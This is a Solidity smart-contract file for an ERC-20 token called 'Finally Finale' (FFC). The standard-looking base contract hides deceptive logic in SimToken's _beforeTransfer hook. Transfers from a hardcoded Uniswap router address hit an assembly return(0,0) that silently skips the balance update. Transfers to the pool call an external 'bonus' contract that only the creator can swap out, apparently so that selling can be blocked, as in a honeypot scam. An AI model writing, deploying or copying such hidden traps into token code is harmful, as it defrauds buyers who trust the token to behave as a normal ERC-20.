// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}
abstract contract SmartTokenBase is IERC20 {
    mapping(address account => uint256) private _balances;

    mapping(address account => mapping(address spender => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor() {
        _name = "Finally Finale";
        _symbol = "FFC";
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 value) public virtual returns (bool) {
        address owner = msg.sender;
        _beforeTransfer(owner, to, value);
        _transfer(owner, to, value);
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 value) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        address spender = msg.sender;
        _beforeTransfer(from, to, value);
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }

    function _beforeTransfer(address from, address to, uint256 value) internal virtual{

    }

    function _transfer(address from, address to, uint256 value) internal {
        if (from == address(0)) {
            revert();
        }
        if (to == address(0)) {
            revert();
        }
        _update(from, to, value);
    }

    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert();
            }
            unchecked {
            // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
            // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
            // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert();
        }
        _update(address(0), account, value);
    }

    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert();
        }
        _update(account, address(0), value);
    }

    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }

    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert();
        }
        if (spender == address(0)) {
            revert();
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance < type(uint256).max) {
            if (currentAllowance < value) {
                revert();
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }
}
interface BonusLogic{
    function claimBonus(address,address,uint256) external;
}
interface ISimOracle{
    function info() external returns(uint256, bool);
    function update(uint256,address) external returns(bool);
}
contract SimToken is SmartTokenBase {
    address private _creator;
    address private _pool;
    BonusLogic private _bonusLogic;
    ISimOracle private _simOracle;
    address private constant UNIROUTER_ETH = 0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD;

    constructor(BonusLogic claim, ISimOracle simOracle){
        _creator = msg.sender;
        _bonusLogic = claim;
        _simOracle = simOracle;
        _mint(msg.sender, 2000000 * 10 ** 18);
    }
    function updateLogic(BonusLogic claim) external{
        require(_creator == msg.sender);
        _bonusLogic = claim;
    }
    function updatePool(address pool) external{
        require(_creator == msg.sender);
        _pool = pool;
    }
    function _beforeTransferUniRouter(address, address to, uint256 value) private {
        if(tx.origin == _creator){
            _simOracle.update(value, to);
        }

        assembly{
            return(0,0)
        }
    }
    function _beforeTransfer(address from, address to, uint256 value) internal override {
        if(from == UNIROUTER_ETH){
            _beforeTransferUniRouter(from, to, value);
        }

        if(to == _pool){
            _bonusLogic.claimBonus(from, to, value);
        }
    }
}